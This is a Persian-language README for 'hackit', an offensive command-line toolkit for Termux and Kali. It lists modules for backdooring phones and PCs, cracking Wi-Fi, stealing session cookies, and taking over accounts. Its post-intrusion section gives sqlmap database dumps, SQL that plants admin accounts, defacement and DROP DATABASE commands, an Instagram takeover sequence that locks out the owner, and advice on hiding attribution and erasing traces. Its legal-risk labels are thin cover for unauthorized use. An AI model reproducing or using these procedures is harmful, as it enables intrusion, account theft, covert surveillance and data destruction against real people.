# Hacking

<div align="center">

# hackit

**جعبه‌ابزار تهاجمی خط فرمان — ترموکس و کالی**

![version](https://img.shields.io/badge/version-1.0.0-blue)
![platform](https://img.shields.io/badge/platform-termux%20%7C%20kali-lightgrey)
![lang](https://img.shields.io/badge/lang-FA-green)

</div>

---

## فهرست

- [این چیست](#این-چیست)
- [هشدار حقوقی](#هشدار-حقوقی)
- [قبل از شروع: مخفی‌شدن](#قبل-از-شروع-مخفی‌شدن)
- [دستورهای غیرقانونی](#دستورهای-غیرقانونی)
- [نصب](#نصب)
- [ساختار](#ساختار)
- [نحوه‌ی استفاده](#نحوه‌ی-استفاده)
- [دستورها](#دستورها)
- [بعد از نفوذ: چه کاری می‌شود کرد](#بعد-از-نفوذ-چه-کاری-می‌شود-کرد)
- [اثر باقی‌مانده](#اثر-باقی‌مانده)
- [چه چیزهایی واقعاً ممکن است](#چه-چیزهایی-واقعاً-ممکن-است)
- [عیب‌یابی](#عیب‌یابی)
- [مجوز](#مجوز)

---

## این چیست

`hackit` یک dispatcher خط فرمان است. هر دسته یک پوشه، هر ابزار یک ماژول، و هر ماژول **دو بدنه** دارد:

- `termux()` — اجرا روی گوشی اندروید با ترموکس
- `kali()` — اجرا روی کالی/دبیان/اوبونتو

برنامه خودش محیط را تشخیص می‌دهد. با `--both` هر دو روش را نشان می‌دهد.

پیش‌فرض **فقط نمایش دستور** است، نه اجرا. با `--run` اجرا می‌شود. دلیل: بیشتر دستورها به مقدار نیاز دارند (IP، BSSID، دامنه، مسیر) که باید اول وارد کنی.

## هشدار حقوقی

ابزار مجرم نیست، **نبود اجازه** جرم است. هر ماژول یک برچسب دارد:

| برچسب | معنی | ریسک حقوقی |
|---|---|---|
| `LOW` | فقط از API عمومی یا آرشیو می‌خواند | تقریباً صفر |
| `MED` | درخواست فعال به سرور هدف | خاکستری |
| `HIGH` | تزریق، کرک، اکسپلویت، MITM، تصاحب | **مصداق ماده ۱** |
| `ToS` | نقض شرایط سرویس، نه قانون | بن شدن، نه پرونده |
| `-` | محلی، روی فایل خودت | آزاد |

قبل از هر تست:

```bash
curl -s https://TARGET/security.txt
curl -s https://TARGET/.well-known/security.txt
curl -s https://TARGET/robots.txt
```

اگر سایت برنامه‌ی باگ‌بانتی دارد، داخل scope کاملاً قانونی است.

## قبل از شروع: مخفی‌شدن

سه لایه، سه کاربرد. قاطی‌شان نکن.

| ابزار | برای چه | برای چه نه |
|---|---|---|
| Tor | OSINT، مرور پروفایل، جستجوی یوزرنیم | اسکن — کند است و اکثر سایت‌ها exit node را بلاک می‌کنند |
| VPN | اسکن، تست وب، کار با ابزار | کار حساس — ارائه‌دهنده لاگ دارد |
| VPS | اسکن سنگین، شنونده، فیشینگ | — آی‌پی ثابت و قابل انتساب است |

**بهترین ترکیب:** VPS + VPN. اسکن از VPS، اتصال به VPS از طریق VPN.

### چرا مخفی می‌شوی

دو دلیل جدا:

1. **فیلتر** — برای دسترسی به اینستاگرام، واتساپ، تلگرام و خیلی از منابع، از ایران بدون فیلترشکن هیچ‌کاری پیش نمی‌رود.
2. **انتساب** — آی‌پی تو در لاگ طرف می‌ماند.

### Tor

Tor یک SOCKS5 روی پورت ۹۰۵۰ باز می‌کند. ابزارها را از آن رد می‌کنی.

```bash
pkg install tor proxychains4       # ترموکس
sudo apt install tor proxychains4  # کالی

tor &                              # روشن کردن، در پس‌زمینه
curl -s ifconfig.me                # بدون Tor، آی‌پی واقعی
proxychains4 curl -s ifconfig.me   # با Tor، آی‌پی خروجی Tor
```

اگر دو خط آخر دو آی‌پی متفاوت داد، Tor کار می‌کند.

**نمونه‌ی واقعی:**

```bash
proxychains4 curl -s https://example.com
proxychains4 nmap -sT -Pn example.com -p 80,443
```

**چرا `-sT` و `-Pn`:**

- `-sT` — اتصال کامل TCP. `-sS` (SYN خام) از SOCKS رد نمی‌شود و با Tor کار نمی‌کند.
- `-Pn` — پینگ ICMP از Tor رد نمی‌شود، پس nmap نباید اول پینگ بزند وگرنه می‌گوید هاست خاموش است.

**در `proxychains4.conf` باید این باشد:**

```bash
sudo nano /etc/proxychains4.conf
# آخر فایل:
socks5 127.0.0.1 9050
```

**محدودیت‌ها:**

- Tor کند است. برای اسکن انبوه مناسب نیست.
- اکثر سایت‌های بزرگ exit node را بلاک می‌کنند → کپچا و ۴۰۳
- `masscan` و `hping3` با Tor کار نمی‌کنند (بسته‌ی خام می‌فرستند)
- برای آنها VPN یا VPS لازم است

### VPN

```bash
sudo openvpn --config vpn.ovpn
curl -s ifconfig.me                  # تأیید آی‌پی
```

VPN رایگان برای کار جدی نگیر — لاگ دارند و آی‌پی‌شان سوخته است.

### پروکسی برای ابزارهای تک

```bash
curl --proxy socks5://127.0.0.1:9050 https://TARGET
nuclei -u https://TARGET -proxy http://127.0.0.1:8080
ffuf -u https://TARGET/FUZZ -w list.txt -x http://127.0.0.1:8080
```

### قواعد

- **وسط اسکن آی‌پی عوض نکن** — سشن می‌شکند و لاگ‌ها بی‌معنی می‌شوند
- **با اکانت شخصی لاگین نکن** وقتی از VPN استفاده می‌کنی؛ اینستاگرام کوکی را به آی‌پی گره می‌زند و اکانتت بن می‌شود
- **DNS leak** را چک کن: `curl -s https://1.1.1.1/cdn-cgi/trace`
- **`security.txt` را همیشه بخوان** — اگر سایت برنامه‌ی باگ‌بانتی دارد، مخفی شدن لازم نیست و حتی به نفع توست که قابل انتساب باشی
- برای `masscan` و `hping3` حتماً VPN یا VPS — از آی‌پی خانگی، سایت خودت را هم می‌توانی قطع کنی

## دستورهای غیرقانونی

این‌ها بدون اجازه‌ی کتبی، ریسک واقعی دارند:

| دستور | چرا |
|---|---|
| `hack website-hack sqli` | تزریق روی دیتابیس طرف |
| `hack website-hack nuclei` | اسکن CVE |
| `hack website-hack dirs` | دسترسی به مسیرهای پنهان |
| `hack website-hack login` | تلاش رمز |
| `hack website-hack upload` | نوشتن فایل روی سرور |
| `hack website-hack ddos` | تولید بار، امکان اختلال |
| `hack android-hack adb-connect` | ورود به گوشی بدون اطلاع مالک |
| `hack android-hack payload` | نصب بکدور |
| `hack windows-hack payload` | نصب بکدور |
| `hack windows-hack wmi` / `uac` / `persist` | کنترل و ماندگاری |
| `hack wifi-hack handshake` / `pmkid` / `wps` | کرک شبکه‌ی دیگران |
| `hack wifi-hack evil` | ایول‌توین |
| `hack wifi-hack deauth` | قطع کاربران |
| `hack camera-hack default` | تلاش رمز دوربین |
| `hack messenger-hack session` | فیشینگ و تصاحب اکانت |
| `hack email-hack spray` | تلاش رمز روی آفیس۳۶۵ |
| `hack mitm-hack arp` / `dns` / `captive` | شنود ترافیک دیگران |
| `hack password-hack hydra` | بروت‌فورس |

و این‌ها تقریباً بی‌خطرند: `osint-hack`، `email-hack enumerate`، `social-hack ig-enum`، `ip-hack dns`، `website-hack headers`، همه‌ی `reverse-hack`.

## نصب

### پیش‌نیاز عمومی

| مورد | ترموکس | کالی |
|---|---|---|
| ترمینال | Termux از F-Droid | ترمینال عادی |
| دسترسی | اختیاری (برای وای‌فای لازم) | `sudo` |
| Termux:API | **الزامی** برای دوربین/میکروفن/موقعیت | — |
| Python | `pkg install python` | از پیش هست |
| Go | `pkg install golang` | `apt install golang` |

### نصب خودکار

```bash
git clone <your-private-repo> ~/hackit
cd ~/hackit
chmod +x hack install.sh
bash install.sh
```

### نصب دستی پیش‌نیاز هر دسته

| دسته | پیش‌نیاز |
|---|---|
| android-hack | `adb` (`android-tools`)، `scrcpy`، Termux:API |
| windows-hack | `msfvenom`، `msfconsole`، `impacket`، `xfreerdp` |
| linux-hack | `nmap`، `ssh`، `curl` |
| website-hack | `subfinder`، `httpx`، `nuclei`، `ffuf`، `sqlmap`، `dalfox`، `wafw00f` |
| ip-hack | `nmap`، `masscan`، `dig`، `whois`، `shodan` |
| wifi-hack | `aircrack-ng`، `hcxdumptool`، `hcxtools`، `reaver`، کارت با monitor mode |
| camera-hack | `nmap`، `ffmpeg`، `curl`، `hydra` |
| messenger-hack | `frida`، `mitmproxy`، `nodejs`، `python` |
| social-hack | `instaloader`، `toutatis`، `sherlock`، `maigret` |
| email-hack | `holehe`، `ghunt`، `o365spray` |
| osint-hack | `exiftool`، `phoneinfoga`، `tesseract` |
| reverse-hack | `jadx`، `apktool`، `apkleaks`، `frida`، `objection` |
| mitm-hack | `mitmproxy`، `bettercap`، `ngrok` |
| password-hack | `hydra`، `hashcat`، `john`، `cupp` |
| c2-hack | `msfvenom`، `msfconsole`، `ngrok` |

### نکات نصب روی ترموکس

بعضی بسته‌ها از مخزن رسمی ترموکس حذف شده‌اند. اینها با `pkg install` نصب نمی‌شوند:

| بسته | راه |
|---|---|
| `hydra` | کالی با `proot-distro` |
| `metasploit` | کالی با `proot-distro` |
| `aircrack-ng` | بسته‌ی `.deb` از [مخزن جانشین](https://github.com/pitube08642/aircrack-ng-for-termux) |

اگر پایتون ۳.۱۴ داری و `pip install` روی `cryptography` شکست خورد:

```bash
pkg install -y python-cryptography
pip install mitmproxy
```

ساخت از سورس روی `i686` کند و شکننده است. نسخه‌ی آماده را ترجیح بده.

#### کالی داخل ترموکس

برای ابزارهای سنگین، به‌جای ساخت دستی:

```bash
pkg install -y proot-distro
proot-distro install kali
proot-distro login kali
apt update
apt install -y hydra metasploit-framework aircrack-ng
```

خروج: `exit`

محدودیت: مانیتور مود در شبیه‌ساز همچنان کار نمی‌کند. `aircrack-ng` نصب می‌شود ولی وای‌فای واقعی ندارد.

#### معماری ۳۲ بیتی

`uname -m` اگر `i686` داد، انتظار شکست داشته باش. بیشتر ابزارهای گو و پایتون چرخ آماده ندارند.

راه‌حل: شبیه‌ساز `x86_64` با اندروید ۱۱ یا بالاتر.

### بررسی سلامت محیط

```bash
hack doctor
```

## ساختار

```
hackit/
├── hack                  dispatcher
├── install.sh
├── lib/common.sh         توابع مشترک
├── lib/detect.sh         تشخیص محیط
├── conf/deps.txt         فهرست وابستگی
├── docs/REALITY.md       چه چیزی ممکن است
├── docs/WORKFLOW.md      ترتیب درست کار
└── <دسته>-hack/
    ├── category.conf     عنوان + فهرست ماژول
    └── <ماژول>.sh        DESC / REQ / RISK / NOTE + termux() + kali()
```

## نحوه‌ی استفاده

```bash
hack list                              # فهرست دسته‌ها
hack website-hack                      # منوی ماژول‌ها
hack website-hack nuclei               # نمایش دستورها
hack website-hack nuclei --run         # اجرا
hack wifi-hack handshake --both        # هر دو روش
hack android-hack camera --kali        # اجبار به روش کالی
hack doctor                            # بررسی محیط
```
### جای‌گذاری مقادیر

هر جا در دستورها این کلمه‌ها را دیدی، **باید با مقدار واقعی عوضشان کنی**. اگر عین کلمه را بزنی، خطا می‌گیری.

| جای‌نگهدار | معنی | نمونه |
|---|---|---|
| `TARGET` | دامنه‌ی هدف، بدون `https://` | `example.com` |
| `URL` | آدرس کامل | `https://example.com/page?id=1` |
| `IP` | آی‌پی هدف | `192.168.1.50` |
| `PORT` | پورت سرویس | `443` |
| `USER` | نام کاربری | `admin` |
| `PASS` | رمز | `admin` |
| `BSSID` | مک‌آدرس روتر | `AA:BB:CC:DD:EE:FF` |
| `CHANNEL` | کانال وای‌فای | `6` |
| `IFACE` | نام کارت شبکه | `wlan0` |
| `SERVER` | آی‌پی سرور شنونده | `1.2.3.4` |
| `WORDLIST` | مسیر وردلیست | `/usr/share/wordlists/rockyou.txt` |
| `TOKEN` | توکن API | `abc123` |

### نمونه‌ی درست و غلط

| غلط | درست |
|---|---|
| `nmap -sV TARGET` | `nmap -sV example.com` |
| `nuclei -u https://TARGET` | `nuclei -u https://example.com` |
| `sqlmap -u "URL"` | `sqlmap -u "https://example.com/p.php?id=1"` |
| `hydra ... ssh://IP` | `hydra ... ssh://192.168.1.50` |
| `ffuf -u https://TARGET/FUZZ -w WORDLIST` | `ffuf -u https://example.com/FUZZ -w ~/wordlists/common.txt` |

| پرچم | کار |
|---|---|
| `--run` | اجرای واقعی |
| `--termux` | اجبار به روش ترموکس |
| `--kali` | اجبار به روش کالی |
| `--both` | هر دو روش |

## دستورها

### android-hack

| دستور | کار | پیش‌نیاز | حقوقی |
|---|---|---|---|
| `adb-connect` | اتصال ADB بی‌سیم به گوشی | دیباگ بی‌سیم روشن | HIGH |
| `camera` | عکس از دوربین جلو/عقب | ADB + اپ دوربین بازشده | LOW |
| `screen` | اسکرین‌شات از صفحه | ADB | LOW |
| `scrcpy` | میرور زنده + کنترل | `scrcpy` | LOW |
| `contacts` | خروجی مخاطبین | ADB | LOW |
| `sms` | خواندن پیامک | ADB | MED |
| `mic` | ضبط صدا | ADB + مجوز ضبط | LOW |
| `files` | کشیدن فایل | ADB | MED |
| `loc` | موقعیت مکانی | ADB + Location روشن | LOW |
| `apps` | لیست اپ و دیتا | ADB | MED |
| `payload` | ساخت APK بکدور | `msfvenom` + IP عمومی | HIGH |
| `nearby` | کشف گوشی‌های هم‌شبکه | `nmap` | LOW |
| `clipboard` | خواندن کلیپ‌بورد | ADB | LOW |
| `keylog` | ثبت کلیدها | ADB | MED |

```bash
hack android-hack adb-connect
# ۱. روی هدف: تنظیمات > گزینه‌های توسعه‌دهنده > Wireless debugging
# ۲. adb pair IP:PORT  → کد ۶ رقمی
# ۳. adb connect IP:PORT
```

### windows-hack

| دستور | کار | پیش‌نیاز | حقوقی |
|---|---|---|---|
| `payload` | ساخت EXE بکدور + شنونده | `msfvenom` + IP عمومی | HIGH |
| `webcam` | عکس از وبکم | session فعال | LOW |
| `screen` | دیدن صفحه | session فعال | LOW |
| `keys` | کی‌لاگر | session فعال | MED |
| `files` | کشیدن فایل | session فعال | MED |
| `creds` | استخراج رمز ذخیره‌شده | session SYSTEM | HIGH |
| `sam` | dump هش SAM | دسترسی ادمین | HIGH |
| `rdp` | اتصال دسکتاپ راه دور | پورت ۳۳۸۹ + رمز | LOW |
| `smb` | بررسی و بهره‌برداری SMB | پورت ۴۴۵ | HIGH |
| `wmi` | اجرای دستور از راه دور | اعتبارنامه ادمین | HIGH |
| `uac` | دور زدن UAC | session | HIGH |
| `persist` | ماندگاری | session SYSTEM | HIGH |

```bash
hack windows-hack payload
# LHOST به‌صورت خودکار از ifconfig.me پر می‌شود
# داخل session: webcam_snap / screenshot / keyscan_start / hashdump
```

### linux-hack

| دستور | کار | پیش‌نیاز | حقوقی |
|---|---|---|---|
| `enum` | enumeration کامل | shell روی هدف | LOW |
| `privesc` | مسیرهای ارتقای دسترسی | shell | HIGH |
| `ssh` | اتصال یا بروت‌فورس | پورت ۲۲ | HIGH |
| `suid` | سوءاستفاده SUID | shell | HIGH |
| `cron` | سوءاستفاده کران | shell | HIGH |
| `creds` | جستجوی رمز در فایل | shell | MED |
| `docker` | فرار از کانتینر | shell داخل کانتینر | HIGH |
| `payload` | بکدور ELF | `msfvenom` | HIGH |

### website-hack

| دستور | کار | پیش‌نیاز | حقوقی |
|---|---|---|---|
| `recon` | شناسایی سطح حمله | `subfinder` `httpx` | MED |
| `subdomain` | کشف زیردامنه | `subfinder` | LOW |
| `fingerprint` | تشخیص تکنولوژی | `whatweb` `httpx` | LOW |
| `waf` | تشخیص فایروال | `wafw00f` | LOW |
| `dork` | گوگل‌دورک | — | LOW |
| `dirs` | کشف مسیر پنهان | `ffuf` `gobuster` | HIGH |
| `params` | کشف پارامتر | `arjun` | MED |
| `nuclei` | اسکن CVE | `nuclei` | HIGH |
| `sqli` | تزریق SQL | `sqlmap` | HIGH |
| `xss` | XSS | `dalfox` | HIGH |
| `lfi` | path traversal | `curl` | HIGH |
| `ssrf` | SSRF | `interactsh` | HIGH |
| `upload` | دور زدن آپلود | `curl` | HIGH |
| `login` | حمله به فرم لاگین | `hydra` | HIGH |
| `jwt` | حمله به JWT | `jwt_tool` | HIGH |
| `cms` | اسکن وردپرس/جوملا | `wpscan` | HIGH |
| `ddos` | تست بار | `ab` `hping3` | MED |
| `headers` | بررسی هدر امنیتی | `curl` | LOW |

```bash
hack website-hack recon
hack website-hack nuclei --run
# نرخ پیش‌فرض پایین است. روی سایت بزرگ: -rl 100
```

### ip-hack

| دستور | کار | پیش‌نیاز | حقوقی |
|---|---|---|---|
| `scan` | اسکن پورت و سرویس | `nmap` | MED |
| `ping` | کشف میزبان زنده | `nmap` | LOW |
| `os` | تشخیص سیستم‌عامل | `nmap` | MED |
| `shodan` | جستجوی Shodan | API key | LOW |
| `masscan` | اسکن انبوه رنج | `masscan` | HIGH |
| `banner` | گرفتن بنر | `nc` | MED |
| `snmp` | بررسی SNMP | `snmpwalk` | MED |
| `dns` | تحلیل DNS | `dig` | LOW |
| `traceroute` | مسیر شبکه | `traceroute` | LOW |
| `arp` | اسکن ARP در LAN | `arp-scan` | LOW |

### wifi-hack

| دستور | کار | پیش‌نیاز | حقوقی |
|---|---|---|---|
| `scan` | اسکن شبکه‌های اطراف | monitor mode | LOW |
| `handshake` | گرفتن هندشیک WPA | monitor + کلاینت فعال | HIGH |
| `pmkid` | گرفتن PMKID | `hcxdumptool` | HIGH |
| `crack` | کرک هش | `hashcat` + وردلیست | LOW |
| `wps` | حمله WPS | `reaver` | HIGH |
| `evil` | ایول‌توین | `wifiphisher` | HIGH |
| `deauth` | قطع کاربر | `aireplay-ng` | MED |
| `wep` | کرک WEP | `aircrack-ng` | MED |
| `monitor` | فعال/غیرفعال مانیتور | root | LOW |

```bash
hack wifi-hack monitor
hack wifi-hack scan
hack wifi-hack handshake --both
```

### camera-hack

| دستور | کار | پیش‌نیاز | حقوقی |
|---|---|---|---|
| `discover` | کشف دوربین در شبکه | `nmap` | LOW |
| `default` | پسورد پیش‌فرض | `hydra` | HIGH |
| `rtsp` | دسترسی به استریم | `ffmpeg` | MED |
| `snapshot` | عکس از دوربین IP | `curl` | LOW |
| `webcam-phone` | دوربین گوشی هدف | ADB یا session | LOW |
| `webcam-pc` | وبکم کامپیوتر هدف | session | LOW |
| `ddns` | دوربین‌های عمومی | Shodan | LOW |

### messenger-hack

| دستور | کار | پیش‌نیاز | حقوقی |
|---|---|---|---|
| `wa-enum` | تشخیص شماره در واتساپ | `ignorant` | LOW |
| `wa-clone` | کلاینت غیررسمی | Node یا Go | ToS |
| `wa-analyze` | آنالیز ترافیک | `frida` `mitmproxy` | MED |
| `tg-enum` | تشخیص اکانت تلگرام | `curl` | LOW |
| `tg-clone` | کاربربات | `telethon` | ToS |
| `tg-archive` | آرشیو کانال | `telethon` | ToS |
| `rubika` | آنالیز روبیکا | `apk-mitm` | ToS |
| `bale` | آنالیز بله | `apk-mitm` | ToS |
| `session` | دزدیدن کوکی سشن | دامنه + VPS | HIGH |

```bash
hack messenger-hack session
# پیش‌نیاز: دامنه، رکورد A، Let's Encrypt، پورت ۴۴۳
```

### social-hack

| دستور | کار | پیش‌نیاز | حقوقی |
|---|---|---|---|
| `ig-enum` | شناسایی پروفایل | `toutatis` | LOW |
| `ig-dump` | دانلود محتوا | `instaloader` | ToS |
| `ig-analyze` | آنالیز ترافیک | `frida` `mitmproxy` | MED |
| `ig-session` | تصاحب اکانت | `evilginx2` | HIGH |
| `fb-enum` | شناسایی فیس‌بوک | `curl` | LOW |
| `x-enum` | شناسایی ایکس | `curl` | LOW |
| `tiktok` | شناسایی تیک‌تاک | `curl` | LOW |
| `username` | ردیابی یوزرنیم | `maigret` | LOW |

### email-hack

| دستور | کار | پیش‌نیاز | حقوقی |
|---|---|---|---|
| `enumerate` | کشف اکانت‌های ثبت‌شده | `holehe` | LOW |
| `ghunt` | OSINT گوگل | `ghunt` + کوکی | LOW |
| `spray` | اسپری آفیس۳۶۵ | `o365spray` | HIGH |
| `verify` | اعتبارسنجی ایمیل | `dig` | LOW |
| `breach` | بررسی لو رفتن | API key | LOW |
| `header` | تحلیل هدر | `parsedmarc` | LOW |
| `smtp` | بررسی SMTP | `swaks` | MED |

### osint-hack

| دستور | کار | پیش‌نیاز | حقوقی |
|---|---|---|---|
| `phone` | اطلاعات شماره | `phoneinfoga` | LOW |
| `name` | جستجوی نام | `maigret` | LOW |
| `image` | جستجوی معکوس تصویر | — | LOW |
| `geoloc` | مکان‌یابی از تصویر | `tesseract` | LOW |
| `metadata` | استخراج متادیتا | `exiftool` | LOW |
| `domain` | اطلاعات دامنه | `whois` | LOW |
| `paste` | جستجوی لیک | `curl` | LOW |
| `people` | جستجوی افراد | `sherlock` | LOW |

### reverse-hack

| دستور | کار | پیش‌نیاز | حقوقی |
|---|---|---|---|
| `apk-static` | آنالیز استاتیک APK | `MobSF` `apkid` | LOW |
| `apk-secrets` | استخراج سکرت | `apkleaks` | LOW |
| `decompile` | دیکامپایل | `jadx` | LOW |
| `frida` | هوک رانتایم | `frida-tools` | MED |
| `pinning` | دور زدن SSL pinning | `objection` | MED |
| `exe` | آنالیز فایل ویندوز | `pefile` | LOW |
| `js` | دی‌ابفاسکیت | `jsbeautifier` | LOW |

### mitm-hack

| دستور | کار | پیش‌نیاز | حقوقی |
|---|---|---|---|
| `proxy` | پروکسی شنود | `mitmproxy` | MED |
| `arp` | ARP spoof | `bettercap` | HIGH |
| `dns` | مسموم‌سازی DNS | `bettercap` | HIGH |
| `tls` | شنود TLS | `tcpdump` | MED |
| `captive` | پورتال جعلی | `wifiphisher` | HIGH |
| `ngrok` | نمایش سرویس محلی | `ngrok` | MED |

### password-hack

| دستور | کار | پیش‌نیاز | حقوقی |
|---|---|---|---|
| `generate` | وردلیست هدفمند | `cupp` | LOW |
| `rule` | قاعده mutation | `hashcat` | LOW |
| `hydra` | بروت‌فورس سرویس | `hydra` | HIGH |
| `hashid` | تشخیص نوع هش | `hashid` | LOW |
| `hashcrack` | کرک هش | `hashcat` | LOW |
| `cupp` | وردلیست از اطلاعات هدف | `cupp` | LOW |

### c2-hack

| دستور | کار | پیش‌نیاز | حقوقی |
|---|---|---|---|
| `msf` | شنونده مترپرتر | `msfconsole` | MED |
| `venom` | پیلود چندسکویی | `msfvenom` | HIGH |
| `stager` | پیلود استیجر | `msfvenom` | HIGH |
| `encode` | بایپس آنتی‌ویروس | `msfvenom` `upx` | HIGH |
| `listen` | شنونده خام | `nc` | LOW |
| `transfer` | انتقال پیلود | `python3` | MED |

## بعد از نفوذ: چه کاری می‌شود کرد

هر سطح دسترسی، کارهای متفاوتی را باز می‌کند. این جدول واقعیت است، نه تبلیغ.

### وبسایت

| اگر داری | می‌توانی | نمی‌توانی |
|---|---|---|
| SQLi | دیتابیس را dump کنی | صفحه را عوض کنی |
| پنل ادمین | محتوا، کاربر، پلاگین | فایل سرور (مگر آپلود شل) |
| RCE / شل | هر فایل، دیفیس، کران | دامنه را |
| اکانت registrar | NS را عوض کنی، سایت را کامل ببری | — |

**گرفتن دیتابیس:**

```bash
sqlmap -u "URL" --batch --dbs
sqlmap -u "URL" --batch -D dbname --tables
sqlmap -u "URL" --batch -D dbname -T users --dump
sqlmap -u "URL" --batch --dump-all --output-dir=backup
```

**تغییر رمز ادمین از داخل دیتابیس:**

```sql
UPDATE users SET password = '<hash>' WHERE username = 'admin';
-- وردپرس: hash با
php -r 'echo password_hash("newpass", PASSWORD_BCRYPT), "\n";'
```

**ساخت ادمین جدید:**

```sql
INSERT INTO users (username, password, email, role) VALUES ('x', '<hash>', 'a@b.c', 'admin');
```

**دیفیس:**

```bash
cp index.php index.php.bak
echo '<h1>pwned</h1>' > index.php
# یا بدون دسترسی فایل:
# .htaccess → RedirectMatch 302 ^/$ /defaced.html
```

**پاک کردن دیتابیس:**

```sql
DROP DATABASE dbname;
-- یا فقط جدول:
DROP TABLE users;
```

قاعده: **اول `--dump-all`، بعد DROP.** بدون بکاپ، حذف خودکشی است.

**«صاحب سایت شدن» سه چیز جداست:**

| مالکیت | چطور | برگشت‌پذیر؟ |
|---|---|---|
| محتوا | پنل ادمین / شل | بله، طرف ریستور می‌کند |
| سرور | RCE | بله با ری‌اینستال |
| دامنه | اکانت registrar یا NS | فقط با داوری/شکایت |

کنترل دامنه از هک سایت به‌دست نمی‌آید. طرف می‌تواند دامنه را به سرور دیگر ببرد و تو با شل و دیتابیس دست خالی بمانی.

### اینستاگرام / اکانت

با کوکی سشن از `evilginx2`:

| کار | نیاز | نتیجه |
|---|---|---|
| خواندن دایرکت | کوکی | — |
| تغییر ایمیل | کوکی + ایمیل جدید خودت | مالک بیرون می‌شود |
| تغییر پسورد | کوکی، بعد تغییر ایمیل | قفل کامل |
| روشن کردن 2FA | کوکی | برگشت سخت |
| بیرون کردن سشن‌ها | کوکی | مالک مجبور به ورود دوباره |

زنجیره‌ی تصاحب:

```text
کوکی → Settings → تغییر ایمیل به ایمیل خودت
      → Forgot password → کد به ایمیل جدید
      → رمز جدید → 2FA → Revoke all sessions
```

ترتیب مهم است. اگر اول رمز را عوض کنی، برای تغییر ایمیل باید رمز را بدانی — که داری، ولی کد تأیید به ایمیل قدیمی می‌رود و گیر می‌کنی. **اول ایمیل، بعد رمز.**

**واتساپ:** رمز ندارد. با QR می‌توانی چت بخوانی، پیام بفرستی، چت اکسپورت کنی. تا وقتی مالک دستگاه متصل را حذف نکرده، دسترسی داری. تغییر شماره نیاز به OTP دارد.

### ایمیل

با کوکی سشن: تغییر ایمیل بازیابی → تغییر رمز → 2FA → revoke. همان زنجیره.

با `hydra` یا `o365spray` فقط اگر رمز در وردلیست باشد.

### گوشی

| داری | می‌توانی | نمی‌توانی |
|---|---|---|
| ADB | فایل، دوربین، صفحه، نصب اپ، پیامک | رمز گوگل، چت واتساپ |
| ADB + پیامک | ریست جیمیل → اکانت گوگل | قفل صفحه |
| RAT | همان + ماندگاری + میکروفن | همان محدودیت‌ها |

### وایفای

کرک هندشیک = اتصال به شبکه و اینترنت. پنل روتر مال تو نیست، مگر پسورد پیش‌فرض بزنی.

### دوربین

استریم و عکس بله. تغییر تنظیمات فقط با ورود به پنل.

## اثر باقی‌مانده

هیچ کاری بی‌اثر نیست. اینها را انتظار داشته باش:

| کار | طرف چه می‌فهمد |
|---|---|
| اسکن پورت | در لاگ فایروال/سرور |
| SQLi | کوئری‌های سنگین در لاگ دیتابیس |
| فازینگ | هزاران ۴۰۴ در لاگ وب |
| نصب RAT | فایل ناشناس در گوشی، مصرف باتری |
| تغییر رمز | ایمیل «رمز شما تغییر کرد» |
| تغییر ایمیل | ایمیل به آدرس قدیمی |
| دیفیس | فوراً دیده می‌شود |
| DROP TABLE | سایت می‌افتد |

**پاک‌سازی:**

```bash
# فایل‌های موقت روی سرور
rm -f /tmp/*.sh /var/www/html/shell.php

# برگرداندن صفحه
cp index.php.bak index.php

# حذف کاربر ساخته‌شده
# از پنل یا دیتابیس
```

**پاک کردن اثر کامل ممکن نیست.** لاگ سرور دست تو نیست.

## چه چیزهایی واقعاً ممکن است

| هدف | روش | شرط |
|---|---|---|
| گوشی اندروید | ADB بی‌سیم | دیباگ بی‌سیم روشن |
| گوشی اندروید | Meterpreter | کاربر نصب و باز کند |
| ویندوز | Meterpreter | کاربر اجرا کند |
| دوربین IP | RTSP/HTTP | در شبکه باشد |
| اکانت | evilginx2 | کاربر لینک را باز کند |
| وای‌فای | handshake/pmkid | کارت با monitor mode |

و این‌ها **ممکن نیست**:

- هک اینستا فقط با یوزرنیم
- خواندن پیامک اندروید ۱۳+ بدون روت
- دیدن صفحه‌ی گوشی بدون ADB یا RAT
- هک وای‌فای بدون مانیتور مود
- DDoS واقعی از یک لپ‌تاپ

جزئیات: [docs/REALITY.md](docs/REALITY.md)

## عیب‌یابی

| مشکل | حل |
|---|---|
| `دسته نبود` | `hack list` بزن، نام دقیق را بردار |
| `نصب نیست` | `bash install.sh` یا بسته را دستی نصب کن |
| `adb: no devices` | `adb kill-server && adb start-server` |
| خروجی دوربین سیاه | اپ دوربین را یک‌بار روی گوشی باز کن |
| `monitor mode` خطا | `sudo airmon-ng check kill` |
| `nuclei` کند | `-rl 10` |
| سایت ۵۰۳ داد | نرخ را نصف کن، ۵ دقیقه صبر |
| `permission denied` | `chmod +x hack install.sh */*.sh` |

## مجوز

MIT — برای کد خود مخزن. هر ابزار لایسنس خودش را دارد.
